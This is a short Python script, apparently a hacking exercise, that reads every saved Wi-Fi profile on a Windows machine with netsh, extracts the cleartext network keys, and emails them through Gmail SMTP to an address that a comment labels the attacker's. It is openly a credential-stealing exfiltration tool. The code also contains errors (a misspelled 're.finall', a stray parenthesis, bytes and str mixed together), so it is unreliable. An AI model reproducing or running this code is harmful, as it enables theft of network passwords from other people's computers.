#!/usr/bin/env python3

import subprocess, re
import smtplib # allows to send email via python

def send_email(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587) # instance of an SMTP server
	server.starttls() # initiate TLS connection
	server.login(email, password) # login to email
	server.sendmail(email, email, message) # send email
	server.quit() # close connection

# GET NETWORK CREDENTIALS FROM THE SYSTEM AND SEND TO ATTACKER'S EMAIL
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.finall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
	command = "netsh wlan show profile " + network_name + " key=clear")
	current_result = subprocess.check_output(command, shell=True)
	result += current_result

send_email("jamesbond@gmail.com", "mrbond007", result)
